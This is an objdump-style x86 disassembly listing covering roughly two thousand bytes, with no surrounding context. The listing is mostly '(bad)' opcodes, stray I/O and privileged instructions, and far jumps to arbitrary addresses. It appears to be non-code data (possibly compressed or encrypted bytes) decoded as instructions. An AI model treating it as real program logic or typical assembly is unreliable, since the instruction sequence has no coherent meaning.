  409555:	rcl    BYTE PTR [edi+0x1d],cl
  409558:	dec    eax
  409559:	(bad)  [edi-0xc]
  40955c:	sbb    ch,al
  40955e:	fs jmp 0x9deb:0x602e80d9
  409566:	mov    dl,0x9c
  409568:	mov    ebp,0x2e3d416f
  40956d:	loopne 0x4095db
  40956f:	enter  0xe667,0xa1
  409573:	xor    dl,BYTE PTR [edx]
  409575:	clc    
  409576:	adc    eax,0x4a18ee97
  40957b:	jle    0x409520
  40957d:	and    al,0xf6
  40957f:	inc    ebp
  409580:	pop    eax
  409581:	or     eax,0x177cf4a4
  409586:	gs jns 0x4095cc
  409589:	push   ecx
  40958a:	xchg   edi,eax
  40958b:	and    BYTE PTR [edx-0x2e],0x66
  40958f:	fdivrp st(4),st
  409591:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409592:	outs   dx,DWORD PTR ds:[esi]
  409593:	sti    
  409594:	xor    bh,BYTE PTR [ebx]
  409596:	cmp    ecx,ebp
  409598:	loop   0x409540
  40959a:	sti    
  40959b:	add    al,0x18
  40959d:	rcl    edx,0x74
  4095a0:	jle    0x40954b
  4095a2:	sbb    BYTE PTR es:[ebp+0x50],ah
  4095a6:	enter  0xfb55,0x5a
  4095aa:	inc    eax
  4095ab:	jno    0x40958a
  4095ad:	cmp    al,0x4
  4095af:	cmp    DWORD PTR [edx-0x56],ebx
  4095b2:	cmp    al,0x58
  4095b4:	mov    esi,0xf301807f
  4095b9:	adc    al,0xe4
  4095bb:	sub    eax,0x882d65d8
  4095c0:	inc    edx
  4095c1:	fsubr  DWORD PTR [esi+ebx*2]
  4095c4:	out    dx,al
  4095c5:	ffreep st(6)
  4095c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4095c8:	add    DWORD PTR [edi+ecx*1-0x29],esi
  4095cc:	xchg   esi,eax
  4095cd:	sub    ebp,DWORD PTR [ebp+0x756899dc]
  4095d3:	inc    esp
  4095d4:	lock clc 
  4095d6:	repz xor BYTE PTR [ebp-0x3cc6e34f],bl
  4095dd:	and    al,0xfb
  4095df:	stos   DWORD PTR es:[edi],eax
  4095e0:	sub    ebp,DWORD PTR [eax-0x10]
  4095e3:	(bad)  
  4095e4:	jmp    0x676c:0x651f570c
  4095eb:	mov    WORD PTR [edx],fs
  4095ed:	jle    0x40963e
  4095ef:	xchg   edi,eax
  4095f0:	or     eax,0xf3a46899
  4095f5:	mov    bh,0xc0
  4095f7:	jo     0x4095cd
  4095f9:	fsub   QWORD PTR [edx]
  4095fb:	pop    ss
  4095fc:	stos   BYTE PTR es:[edi],al
  4095fd:	jae    0x40965b
  4095ff:	push   es
  409600:	js     0x409617
  409602:	(bad)  
  409603:	mov    edi,0x7bbeeac0
  409608:	cdq    
  409609:	xor    DWORD PTR ds:0x8f05cf81,eax
  40960f:	sub    ch,dl
  409611:	mov    ds:0xe492e2c1,al
  409616:	rcl    ch,0xab
  409619:	push   0xffffffc9
  40961b:	fdivr  QWORD PTR [ebp+0x52073e51]
  409621:	sub    eax,0xfa00a2f9
  409626:	xchg   DWORD PTR [edx-0x2b],edi
  409629:	and    al,0xf4
  40962b:	jmp    0x2276346e
  409630:	pushf  
  409631:	pop    edx
  409632:	jae    0x40962a
  409634:	and    DWORD PTR [edi],edx
  409636:	out    dx,al
  409637:	jb     0x409608
  409639:	jno    0x4095f4
  40963b:	add    al,BYTE PTR [ebx+0x19e2b3f]
  409641:	adc    eax,0x2f3e9ba4
  409646:	inc    edi
  409647:	sbb    esp,DWORD PTR [ebx]
  409649:	dec    ecx
  40964a:	inc    ebx
  40964b:	sub    eax,0x8893d400
  409650:	push   esp
  409651:	into   
  409652:	(bad)  
  409653:	div    DWORD PTR [ebx]
  409655:	xor    al,0xcb
  409657:	daa    
  409658:	fmul   st,st(5)
  40965a:	sbb    edi,ebx
  40965c:	jge    0x409695
  40965e:	cmp    edi,0x4400771c
  409664:	push   ebx
  409665:	rcl    BYTE PTR [edi-0x6f],1
  409668:	mov    WORD PTR [edi+0x1db197dd],?
  40966e:	icebp  
  40966f:	dec    bx
  409671:	mov    ebp,0x16dd807b
  409676:	mov    ch,0x7e
  409678:	or     BYTE PTR [eax+0x65fc4c20],ah
  40967e:	mov    ds:0x8e0a5dbd,al
  409683:	push   es
  409684:	dec    ebx
  409685:	xchg   ecx,eax
  409686:	icebp  
  409687:	loope  0x4096d1
  409689:	xchg   BYTE PTR [ebp+0x5f3a59cb],dl
  40968f:	std    
  409690:	push   cs
  409691:	jp     0x409639
  409693:	bound  edx,QWORD PTR ds:0xba3bbab9
  409699:	xor    edi,DWORD PTR [ecx-0x4e5f2c41]
  40969f:	outs   dx,DWORD PTR ds:[esi]
  4096a0:	sub    al,0xf0
  4096a2:	push   ebx
  4096a3:	mov    ds:0x342c4db6,al
  4096a8:	dec    BYTE PTR [edx+0x7]
  4096ab:	stos   DWORD PTR es:[edi],eax
  4096ac:	out    0x19,eax
  4096ae:	es out dx,al
  4096b0:	sbb    cl,al
  4096b2:	or     eax,0xc44a46d5
  4096b7:	cmp    al,0x6
  4096b9:	rol    BYTE PTR [ecx+0x2d1f5d79],cl
  4096bf:	pop    ecx
  4096c0:	cwde   
  4096c1:	ds jo  0x409732
  4096c4:	adc    eax,0xf846c32d
  4096c9:	and    al,0x4
  4096cb:	push   0x2f7cfe95
  4096d0:	inc    esp
  4096d1:	adc    bh,ch
  4096d3:	mov    al,ds:0xbab5f1b4
  4096d8:	jae    0x40972d
  4096da:	fnstenv [ebx+0x52]
  4096dd:	jge    0x40971c
  4096df:	(bad)  
  4096e0:	mov    DWORD PTR [esi-0x25],esi
  4096e3:	and    ah,ah
  4096e5:	jns    0x4096ef
  4096e7:	retf   0x3a1
  4096ea:	jnp    0x4096b9
  4096ec:	js     0x4096d6
  4096ee:	mov    ebx,edi
  4096f0:	nop
  4096f1:	clc    
  4096f2:	dec    ebx
  4096f3:	push   ebp
  4096f4:	aas    
  4096f5:	jp     0x409681
  4096f7:	leave  
  4096f8:	out    dx,eax
  4096f9:	inc    edi
  4096fa:	adc    cl,BYTE PTR [esi-0x67aa424b]
  409700:	lods   al,BYTE PTR ss:[esi]
  409702:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409703:	jmp    0x409692
  409705:	ja     0x409690
  409707:	pop    ebp
  409708:	mov    esp,0x2c022d7b
  40970d:	push   esi
  40970e:	cmp    esi,ebp
  409710:	addr16 (bad) 
  409712:	(bad)  
  409713:	aas    
  409714:	shl    BYTE PTR [esi],cl
  409716:	mov    eax,es:0xc5b843e3
  40971c:	mov    dl,0x8d
  40971e:	fldenv ds:[ecx+0x28fccd10]
  409725:	or     eax,0x8db6d939
  40972a:	and    BYTE PTR [ecx],bh
  40972c:	es pop ebp
  40972e:	and    DWORD PTR [ebx+ebp*2-0x215c302f],edx
  409735:	cld    
  409736:	adc    dh,BYTE PTR [ecx-0xf]
  409739:	js     0x40977f
  40973b:	inc    ecx
  40973c:	pop    ds
  40973d:	xchg   esi,eax
  40973e:	fidiv  WORD PTR [ecx+0x5]
  409741:	mov    DWORD PTR [ebp+0x7b51fc07],0x735c0a8e
  40974b:	sbb    BYTE PTR [ecx],bl
  40974d:	and    BYTE PTR [esi-0x139e7e06],0x14
  409754:	in     al,0xe6
  409756:	or     esi,esi
  409758:	dec    ecx
  409759:	jb     0x409789
  40975b:	jecxz  0x409780
  40975d:	lods   eax,DWORD PTR ds:[esi]
  40975e:	fwait
  40975f:	xchg   BYTE PTR [esi],bl
  409761:	cmp    al,0xbe
  409763:	sbb    al,0xef
  409765:	push   cs
  409766:	fiadd  DWORD PTR [ecx+ebx*2]
  409769:	mov    dh,0x66
  40976b:	sub    BYTE PTR [eax],al
  40976d:	ss pop esp
  40976f:	pushf  
  409770:	push   ebx
  409771:	popa   
  409772:	or     bl,ch
  409774:	lods   eax,DWORD PTR ds:[esi]
  409775:	and    BYTE PTR [edi-0x128928d3],bh
  40977b:	pop    ss
  40977c:	fisubr DWORD PTR [esi-0x73]
  40977f:	mov    BYTE PTR [esi+0x58492762],cl
  409785:	add    al,0x73
  409787:	cdq    
  409788:	sub    cl,BYTE PTR [edi]
  40978a:	cmp    BYTE PTR [ebx+0x2a926b41],dh
  409790:	int    0xa5
  409792:	call   0x1237:0xfe3b67b7
  409799:	mov    ecx,0x70e80d89
  40979e:	ja     0x4097c3
  4097a0:	sahf   
  4097a1:	pop    ss
  4097a2:	push   esi
  4097a3:	or     BYTE PTR [esi+0x7077179d],dl
  4097a9:	ror    ch,0x6f
  4097ac:	xor    cl,dh
  4097ae:	neg    BYTE PTR ds:0x5b51a604
  4097b4:	inc    edx
  4097b5:	push   ecx
  4097b6:	daa    
  4097b7:	gs gs pop ecx
  4097ba:	mov    ds:0x3828757d,eax
  4097bf:	fisub  DWORD PTR [ecx+0x48]
  4097c2:	push   es
  4097c3:	pop    edx
  4097c4:	jmp    0x4097f1
  4097c6:	leave  
  4097c7:	push   esp
  4097c8:	pushf  
  4097c9:	push   esp
  4097ca:	xchg   esi,eax
  4097cb:	sbb    al,0xf2
  4097cd:	stc    
  4097ce:	mov    edx,0xdee65a8e
  4097d3:	in     al,dx
  4097d4:	pop    gs
  4097d6:	jb     0x409794
  4097d8:	js     0x4097dc
  4097da:	jb     0x4097ca
  4097dc:	sub    ch,BYTE PTR [eax+0x42]
  4097df:	sub    DWORD PTR [ecx],esi
  4097e1:	call   DWORD PTR [eax+0x366fbb2e]
  4097e7:	lods   eax,DWORD PTR ds:[esi]
  4097e8:	jo     0x40980f
  4097ea:	call   0x25c1:0xb2f6325
  4097f1:	fwait
  4097f2:	test   eax,0xe4797e4b
  4097f7:	sub    eax,0x4e7b5de2
  4097fc:	sbb    eax,DWORD PTR [ebp+0x66773d8e]
  409802:	(bad)  
  409803:	mov    ecx,0xb64c5016
  409808:	leave  
  409809:	cmp    eax,0x20972687
  40980e:	xchg   esp,eax
  40980f:	xor    al,BYTE PTR [edx-0x26]
  409812:	mov    ds:0x35d4b706,eax
  409817:	rcr    DWORD PTR [eax-0x61],1
  40981a:	ss inc edx
  40981c:	das    
  40981d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40981e:	dec    esi
  40981f:	ss pop es
  409821:	pop    eax
  409822:	mov    ah,0x62
  409824:	or     bh,al
  409826:	ins    BYTE PTR es:[edi],dx
  409827:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409828:	cs sub al,0xb8
  40982b:	pop    ebx
  40982c:	gs xchg esi,eax
  40982e:	xor    al,0xe
  409830:	cmp    ebx,eax
  409832:	jl     0x4097e7
  409834:	sti    
  409835:	jge    0x409805
  409837:	and    DWORD PTR [ebp-0x10],edx
  40983a:	mov    ch,0x30
  40983c:	inc    ecx
  40983d:	outs   dx,DWORD PTR ds:[esi]
  40983e:	xor    al,0xf6
  409840:	cmp    DWORD PTR [edi],eax
  409842:	inc    ebx
  409843:	sbb    dl,0xea
  409846:	sub    cl,BYTE PTR [esi-0x47]
  409849:	lods   eax,DWORD PTR ds:[esi]
  40984a:	test   al,0x2
  40984d:	dec    edx
  40984e:	mov    edi,0xa9183820
  409853:	nop
  409854:	shl    BYTE PTR [ecx-0x32],0xef
  409858:	mov    ah,0x47
  40985a:	push   0xfffffff3
  40985c:	daa    
  40985d:	dec    ebx
  40985e:	jl     0x4098d5
  409860:	adc    bl,BYTE PTR [esi]
  409862:	into   
  409863:	adc    DWORD PTR [edi-0x26],ecx
  409866:	mov    eax,?
  409868:	pop    ebp
  409869:	mov    ah,0x6f
  40986b:	sub    eax,0x10a78688
  409870:	sub    edi,edx
  409872:	mov    BYTE PTR [ebx-0x1de78731],ch
  409878:	mov    ch,0x32
  40987a:	std    
  40987b:	adc    al,0x4f
  40987d:	push   edi
  40987e:	or     BYTE PTR [ecx],0xeb
  409881:	and    cl,bl
  409883:	xor    BYTE PTR [ecx+eiz*4+0x10],dl
  409887:	and    ah,0xd9
  40988a:	ins    DWORD PTR es:[edi],dx
  40988b:	mov    bl,0x38
  40988d:	imul   eax,DWORD PTR [ebx+0x2e],0x4b222b9b
  409894:	xchg   edx,eax
  409895:	sbb    BYTE PTR [esi-0x2f],ch
  409898:	js     0x4098a6
  40989a:	sahf   
  40989b:	mov    BYTE PTR [edi+0x279695c1],bh
  4098a1:	cmp    ebp,eax
  4098a3:	jle    0x409894
  4098a5:	adc    ebx,DWORD PTR [edx]
  4098a7:	push   ds
  4098a8:	jbe    0x4098dd
  4098aa:	pop    ds
  4098ab:	add    BYTE PTR [eax],ah
  4098ad:	pop    esp
  4098ae:	out    dx,al
  4098af:	rcr    BYTE PTR [ebx-0x25],cl
  4098b2:	rcl    DWORD PTR [eax+ecx*8],0x48
  4098b6:	call   0xe334c705
  4098bb:	leave  
  4098bc:	jns    0x4098f8
  4098be:	mov    esp,0x8e8b859b
  4098c3:	rcr    DWORD PTR [ebx],0xe3
  4098c6:	mov    bl,0x54
  4098c8:	add    DWORD PTR [edx-0xe026e77],0x17
  4098cf:	mov    ch,0x59
  4098d1:	adc    al,0x62
  4098d3:	dec    esi
  4098d4:	out    0xfd,eax
  4098d6:	hlt    
  4098d7:	icebp  
  4098d8:	jne    0x409959
  4098da:	mov    ebp,0x1357e07e
  4098df:	ins    BYTE PTR es:[edi],dx
  4098e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4098e1:	push   ebx
  4098e2:	xchg   BYTE PTR [edi+0x29],bh
  4098e5:	jecxz  0x40989b
  4098e7:	outs   dx,BYTE PTR ds:[esi]
  4098e8:	cs jne 0x409897
  4098eb:	inc    eax
  4098ec:	push   0xffffffff
  4098ee:	sar    DWORD PTR [esp+eax*1+0x4ef16ca5],0x1f
  4098f6:	clc    
  4098f7:	daa    
  4098f8:	ss jb  0x409947
  4098fb:	popa   
  4098fc:	sub    esi,DWORD PTR [edx]
  4098fe:	fidivr WORD PTR [edi-0x168d922]
  409904:	dec    eax
  409905:	not    BYTE PTR [ebx+0x1fc585c7]
  40990b:	hlt    
  40990c:	cmovs  esi,DWORD PTR [edi+0x29509917]
  409913:	sub    esp,DWORD PTR [ecx+ecx*8]
  409916:	sub    eax,esi
  409918:	fidivr DWORD PTR [ecx-0x501cd461]
  40991e:	sub    esi,ecx
  409920:	sub    esp,DWORD PTR fs:[edx-0x1c]
  409924:	xchg   ecx,eax
  409925:	test   BYTE PTR [ebp-0x5f],bl
  409928:	or     al,0x88
  40992a:	mov    dl,0xf4
  40992c:	add    eax,0xe21dcf24
  409931:	daa    
  409932:	fprem1 
  409934:	pop    edi
  409935:	sub    DWORD PTR [edx+0x6b],edx
  409938:	mov    ebx,0x3ec081b7
  40993d:	mov    al,0x92
  40993f:	test   DWORD PTR [esi],edx
  409941:	pop    ds
  409942:	sub    esi,DWORD PTR [eax+0x40]
  409945:	or     dl,BYTE PTR [ecx+0x42]
  409948:	mov    al,dh
  40994a:	mov    ds:0xd7548747,al
  40994f:	hlt    
  409950:	in     eax,0x99
  409952:	(bad)  
  409953:	loope  0x409909
  409955:	das    
  409956:	in     al,dx
  409957:	(bad)  
  409958:	fsub   DWORD PTR [ebx+0x60647a3]
  40995e:	(bad)  
  40995f:	aad    0x4f
  409961:	ins    BYTE PTR es:[edi],dx
  409962:	clc    
  409963:	ret    0xc7f3
  409966:	scas   al,BYTE PTR es:[edi]
  409967:	dec    ebx
  409968:	jmp    0x2a16c2bf
  40996d:	sbb    DWORD PTR gs:[ebp-0x59],edi
  409971:	mov    edx,0x355903ca
  409976:	xor    BYTE PTR [edi+0x26],cl
  409979:	and    al,bh
  40997b:	fcmovnbe st,st(1)
  40997d:	daa    
  40997e:	inc    eax
  40997f:	cmp    eax,0xf5f24154
  409984:	push   esp
  409985:	push   ecx
  409986:	pop    eax
  409987:	push   esi
  409988:	inc    esi
  409989:	mov    eax,0xfb9d9026
  40998e:	ss xchg edi,eax
  409990:	stos   DWORD PTR es:[edi],eax
  409991:	mov    WORD PTR [edx],gs
  409993:	loope  0x409a11
  409995:	or     eax,0x403c53ea
  40999a:	lea    eax,[ebx]
  40999c:	test   al,0x88
  40999e:	and    esi,esi
  4099a0:	lods   al,BYTE PTR ds:[esi]
  4099a1:	test   BYTE PTR [eax+0x7f720c00],dl
  4099a7:	xor    ch,al
  4099a9:	adc    eax,0x13fd74a1
  4099ae:	sahf   
  4099af:	dec    edi
  4099b0:	jno    0x911413aa
  4099b6:	pop    esi
  4099b7:	jnp    0x40997d
  4099b9:	jg     0x409956
  4099bb:	sub    al,0x50
  4099bd:	jnp    0x409a01
  4099bf:	mov    bh,0xcc
  4099c1:	ret    0x3d8
  4099c4:	xchg   ebp,eax
  4099c5:	dec    esp
  4099c6:	mov    cl,0xb2
  4099c8:	pop    esp
  4099c9:	into   
  4099ca:	jae    0x409992
  4099cc:	pop    eax
  4099cd:	outs   dx,DWORD PTR ds:[esi]
  4099ce:	sub    DWORD PTR ds:0xdc0c184c,eax
  4099d4:	push   cs
  4099d5:	push   edi
  4099d6:	sar    dl,1
  4099d8:	or     eax,0xc4df062b
  4099dd:	icebp  
  4099de:	fsubr  st,st(7)
  4099e0:	shl    DWORD PTR [edx+0x4c93f8b7],1
  4099e6:	sbb    bl,BYTE PTR [ecx]
  4099e8:	js     0x409a4a
  4099ea:	fisttp QWORD PTR [edi]
  4099ec:	lock fucomi st,st(0)
  4099ef:	pop    ecx
  4099f0:	test   BYTE PTR [eax-0x1c9e2120],cl
  4099f6:	jge    0x4099f2
  4099f8:	pop    esi
  4099f9:	test   edi,esi
  4099fb:	inc    edx
  4099fc:	xor    al,0x5b
  4099fe:	lds    ecx,FWORD PTR [eax]
  409a00:	and    eax,0x7a2adfd9
  409a05:	xor    al,BYTE PTR [ebp-0xddcbab9]
  409a0b:	lods   al,BYTE PTR ds:[esi]
  409a0c:	xchg   BYTE PTR [ebp-0x3d4ebd3e],ah
  409a12:	sar    cl,0x99
  409a15:	dec    eax
  409a16:	jne    0x409a0f
  409a18:	mov    al,ds:0xe9e9a68b
  409a1d:	fwait
  409a1e:	(bad)  
  409a1f:	mov    bl,0x5b
  409a21:	shl    ecx,cl
  409a23:	mov    cl,0x23
  409a25:	cmp    edi,DWORD PTR [ebp+0x24cc3328]
  409a2b:	mov    edi,DWORD PTR [edi]
  409a2d:	pop    ebx
  409a2e:	mov    ds:0xa9e56587,eax
  409a33:	jns    0x409a5e
  409a35:	stc    
  409a36:	push   ss
  409a37:	mov    DWORD PTR [ebx-0x6eed847c],ebx
  409a3d:	or     eax,0x54883d20
  409a42:	and    edx,0x8050968a
  409a48:	cmp    dl,bh
  409a4a:	pop    esp
  409a4b:	or     BYTE PTR [edx-0x2073fca8],bl
  409a51:	pavgb  mm5,mm3
  409a54:	push   0xffffff87
  409a56:	test   edi,edi
  409a58:	mov    ds:0x2da7c7ef,eax
  409a5d:	xchg   esi,eax
  409a5e:	push   esi
  409a5f:	mov    eax,ds:0xac371c33
  409a64:	mov    eax,ds:0x907618e4
  409a69:	xchg   ebx,eax
  409a6a:	xor    BYTE PTR [edi+0x7d653f1e],dh
  409a70:	xchg   DWORD PTR [eax],esp
  409a72:	loope  0x409a1f
  409a74:	sbb    BYTE PTR [ebx-0x1],dh
  409a77:	in     al,dx
  409a78:	cmp    esi,DWORD PTR [ecx-0x67]
  409a7b:	int3   
  409a7c:	fwait
  409a7d:	mov    dl,dl
  409a7f:	repnz fcom st(2)
  409a82:	imul   ebx,DWORD PTR [esi-0x2c],0xffffffa6
  409a86:	pop    edi
  409a87:	xchg   edx,eax
  409a88:	and    al,0x8c
  409a8a:	adc    al,0xa7
  409a8c:	ins    DWORD PTR es:[edi],dx
  409a8d:	out    0xee,al
  409a8f:	mov    edx,0x1e1f84f8
  409a94:	daa    
  409a95:	push   eax
  409a96:	int3   
  409a97:	xlat   BYTE PTR ds:[ebx]
  409a98:	sbb    BYTE PTR [edx+edi*8-0x76a13396],cl
  409a9f:	dec    ecx
  409aa0:	lahf   
  409aa1:	data16 cld 
  409aa3:	mov    cl,0x36
  409aa5:	dec    ebx
  409aa6:	sti    
  409aa7:	mov    esi,0x818fe76
  409aac:	daa    
  409aad:	mov    edi,0x9f602ec7
  409ab2:	nop
  409ab3:	jns    0x409a41
  409ab5:	scas   al,BYTE PTR es:[edi]
  409ab6:	fild   WORD PTR [esi-0xb]
  409ab9:	jle    0x409a6f
  409abb:	ss cdq 
  409abd:	inc    ecx
  409abe:	mov    edi,0x5a89bbb0
  409ac3:	sbb    al,0x4f
  409ac5:	mov    ah,0x3e
  409ac7:	cmp    DWORD PTR [edi+ebx*4+0x14457e7d],esi
  409ace:	cli    
  409acf:	div    ecx
  409ad1:	pop    ebx
  409ad2:	mov    ds:0xf58defc8,al
  409ad7:	and    BYTE PTR [ecx+eax*2-0x67798b75],dl
  409ade:	adc    dl,BYTE PTR [edx]
  409ae0:	scas   al,BYTE PTR es:[edi]
  409ae1:	mov    ch,0x47
  409ae3:	(bad)  
  409ae4:	scas   al,BYTE PTR es:[edi]
  409ae5:	add    dh,dl
  409ae7:	cmp    eax,ebx
  409ae9:	js     0x409a79
  409aeb:	mov    DWORD PTR [esp+ecx*4-0x3bf8ecce],0x9f826642
  409af6:	push   esi
  409af7:	bswap  esi
  409af9:	mov    ebp,DWORD PTR [eax]
  409afb:	jmp    0x409ad4
  409afd:	popa   
  409afe:	out    dx,eax
  409aff:	push   ebp
  409b00:	mov    eax,ds:0xdcceb73c
  409b05:	mov    ds:0x9ee2a0ee,eax
  409b0a:	xchg   ebp,eax
  409b0b:	hlt    
  409b0c:	pop    esi
  409b0d:	mov    dh,0xa5
  409b0f:	loop   0x409ae9
  409b11:	xor    ebp,DWORD PTR [ecx+ebx*1-0x55264164]
  409b18:	cmc    
  409b19:	inc    ebp
  409b1a:	outs   dx,DWORD PTR ds:[esi]
  409b1b:	xor    eax,0x9c742fa6
  409b20:	lods   al,BYTE PTR ds:[esi]
  409b21:	shl    BYTE PTR ss:[ebx+0x1c],cl
  409b25:	out    dx,al
  409b26:	cmp    ch,0xa6
  409b29:	push   0xe69cf16b
  409b2e:	mov    ds:0xfcc8cce1,al
  409b33:	cmp    al,0x13
  409b35:	ret    
  409b36:	(bad)  
  409b37:	lahf   
  409b38:	repnz cmp DWORD PTR [ebp-0x3cdbdc14],edi
  409b3f:	out    0x15,al
  409b41:	ret    0xb5a6
  409b44:	pop    ebx
  409b45:	inc    eax
  409b46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b47:	cwde   
  409b48:	jecxz  0x409b4f
  409b4a:	mov    ds:0xc999b53a,eax
  409b4f:	stos   BYTE PTR es:[edi],al
  409b50:	std    
  409b51:	adc    esp,eax
  409b53:	or     eax,0x7ecc7d3c
  409b58:	pusha  
  409b59:	cmp    BYTE PTR [ecx-0x52],cl
  409b5c:	lock xlat BYTE PTR ds:[ebx]
  409b5e:	or     eax,0xf26bc8fb
  409b63:	loope  0x409bdf
  409b65:	pop    ds
  409b66:	and    edi,DWORD PTR [ecx+0x44cf9aae]
  409b6c:	ins    DWORD PTR es:[edi],dx
  409b6d:	mov    ss,WORD PTR [ecx]
  409b6f:	sub    DWORD PTR [esi+ebx*1-0x6b5d47e6],eax
  409b76:	pusha  
  409b77:	dec    ebp
  409b78:	xchg   edi,eax
  409b79:	bound  edx,QWORD PTR [esi+0x184f055d]
  409b7f:	mov    ds:0x2c7c12d7,al
  409b84:	mov    bh,0xc9
  409b86:	inc    ebx
  409b87:	mov    esp,0xd904648f
  409b8c:	pop    ecx
  409b8d:	nop
  409b8e:	popf   
  409b8f:	jb     0x409bfb
  409b91:	push   ecx
  409b92:	call   0xb5d1:0xad9e6cf7
  409b99:	mov    edx,0xaf544ef5
  409b9e:	sar    DWORD PTR [edi+0x43662a5e],1
  409ba4:	xchg   ebx,eax
  409ba5:	rol    BYTE PTR [ebp-0x7c4c2373],0x13
  409bac:	jecxz  0x409b46
  409bae:	rol    DWORD PTR [ebp+0x50000870],cl
  409bb4:	out    dx,al
  409bb5:	les    ecx,FWORD PTR [edi+edi*1-0x6]
  409bb9:	push   esp
  409bba:	push   ss
  409bbb:	inc    esi
  409bbc:	xor    al,ch
  409bbe:	aad    0x9
  409bc0:	(bad)  
  409bc1:	jge    0x409c23
  409bc3:	mov    ch,BYTE PTR [edx+0x5c]
  409bc6:	hlt    
  409bc7:	cmp    al,0x5b
  409bc9:	(bad)  [edi]
  409bcb:	dec    esp
  409bcc:	jo     0x409b5a
  409bce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409bcf:	jmp    0x4fbf:0x4c9d3ba6
  409bd6:	sti    
  409bd7:	push   DWORD PTR [ebp+0x578601e3]
  409bdd:	pop    DWORD PTR [eax+0x30]
  409be0:	(bad)  
  409be2:	aas    
  409be3:	stos   BYTE PTR es:[edi],al
  409be4:	addr16 pop ss
  409be6:	lahf   
  409be7:	inc    ch
  409be9:	xchg   esi,ebp
  409beb:	fucom  st(2)
  409bed:	xchg   esi,eax
  409bee:	(bad)  
  409bf0:	ret    
  409bf1:	daa    
  409bf2:	loope  0x409be3
  409bf4:	mov    ebx,DWORD PTR [eax]
  409bf6:	cld    
  409bf7:	mov    BYTE PTR [esi-0x75d3e94],al
  409bfd:	cmp    dl,BYTE PTR [edi]
  409bff:	mov    esi,0x35a7b4cd
  409c04:	and    eax,0x403773d3
  409c09:	xchg   edi,eax
  409c0a:	sub    DWORD PTR ds:0x4dca9f34,eax
  409c10:	jge    0x409b93
  409c12:	les    eax,FWORD PTR ds:0x708cf8ab
  409c18:	aam    0x19
  409c1a:	cs fxch st(6)
  409c1d:	idiv   BYTE PTR [edi+ebx*1+0x26154a67]
  409c24:	pushf  
  409c25:	loop   0x409c1d
  409c27:	pop    ebp
  409c28:	push   0xcd19b1f0
  409c2d:	xchg   ebp,eax
  409c2e:	in     eax,dx
  409c2f:	scas   al,BYTE PTR es:[edi]
  409c30:	inc    esi
  409c31:	or     eax,0x9db9c1ad
  409c36:	int3   
  409c37:	ror    BYTE PTR [ecx+0x23],0x37
  409c3b:	in     eax,dx
  409c3c:	bound  ebp,QWORD PTR [ecx-0x1822e664]
  409c42:	stc    
  409c43:	scas   al,BYTE PTR es:[edi]
  409c44:	sub    ch,BYTE PTR [ebp+edx*8+0x6a]
  409c48:	xchg   esi,eax
  409c49:	popf   
  409c4a:	mov    bl,0x64
  409c4c:	xor    eax,0xa15842d3
  409c51:	test   edi,ecx
  409c53:	fimul  WORD PTR [ebx-0x56]
  409c56:	push   esp
  409c57:	xor    eax,0x6092d432
  409c5c:	sub    al,bl
  409c5e:	add    al,BYTE PTR [ebx]
  409c60:	(bad)  
  409c61:	mov    eax,0xeae58d36
  409c66:	neg    DWORD PTR [eax]
  409c68:	js     0x409ca7
  409c6a:	ss mov esi,0xce8ed90e
  409c70:	push   esp
  409c71:	push   ds
  409c72:	int    0x23
  409c74:	add    al,0xf5
  409c76:	nop
  409c77:	repnz outs dx,DWORD PTR ds:[esi]
  409c79:	sbb    al,0x22
  409c7b:	jg     0x409ca1
  409c7d:	sbb    DWORD PTR [eax+0x7c],0x38
  409c81:	xlat   BYTE PTR ds:[ebx]
  409c82:	loope  0x409c5e
  409c84:	mov    ebp,0x46b821f2
  409c89:	std    
  409c8a:	jne    0x409c1c
  409c8c:	shl    BYTE PTR [ebx],1
  409c8e:	ja     0x409c9f
  409c90:	cli    
  409c91:	popa   
  409c92:	jae    0x409caf
  409c94:	ja     0x409caf
  409c96:	outs   dx,BYTE PTR ds:[esi]
  409c97:	cmp    eax,0x1130144f
  409c9c:	in     al,dx
  409c9d:	inc    ecx
  409c9e:	cmp    bl,BYTE PTR [esi-0x41c34056]
  409ca4:	xchg   edi,eax
  409ca5:	jl     0x409cf2
  409ca7:	xchg   edi,eax
  409ca8:	ds cdq 
  409caa:	add    esp,ebp
  409cac:	xchg   esi,eax
  409cad:	sub    BYTE PTR [eax-0x4876ed37],0xeb
  409cb4:	(bad)  
  409cb5:	aad    0x20
  409cb7:	adc    cl,BYTE PTR [esi-0x5bbc0712]
  409cbd:	lds    eax,FWORD PTR [edx+0x73]
  409cc0:	and    ch,BYTE PTR [ebx+0x63]
  409cc3:	nop
  409cc4:	or     al,BYTE PTR [esi-0x43dfb510]
  409cca:	mov    eax,0xe04753b9
  409ccf:	dec    edi
  409cd0:	fldenv [edi]
  409cd2:	ins    DWORD PTR es:[edi],dx
  409cd3:	fs adc ecx,esp
  409cd6:	(bad)  
  409cd7:	ss inc edx
  409cd9:	(bad)  
  409cda:	dec    ecx
  409cdb:	ror    DWORD PTR [edx],0x4b
  409cde:	mov    dh,cl
  409ce0:	adc    cl,bl
  409ce2:	inc    ebp
  409ce3:	out    dx,eax
  409ce4:	pop    edi
  409ce5:	jle    0x409ce1
  409ce7:	(bad)  
  409ce8:	cld    
  409ce9:	gs cmp esp,ebp
  409cec:	and    BYTE PTR [eax-0x2c],al
  409cef:	mul    ebx
  409cf1:	into   
  409cf2:	jg     0x409d32
  409cf4:	ja     0x409c95
  409cf6:	psllw  mm6,QWORD PTR [ecx]
  409cf9:	cmp    eax,0xd1e0d9f
  409cfe:	jns    0x409cff
  409d00:	jae    0x409d65
  409d02:	jp     0x409d12
  409d04:	pop    eax
  409d05:	je     0x409d76
  409d07:	dec    edi
  409d08:	xor    al,0x7d
  409d0a:	mov    edx,0x1db14b6e
  409d0f:	sbb    ch,ah
  409d11:	or     al,0xfb
  409d13:	std    
  409d14:	sub    al,0x91
  409d16:	dec    edi
  409d17:	sub    ch,BYTE PTR [edx+0x23]
  409d1a:	jp     0x409cf3
  409d1c:	and    BYTE PTR [edx+0x1],al
  409d1f:	mov    edi,0xc9c0c98d
  409d24:	in     eax,0xd5
  409d26:	push   ebx
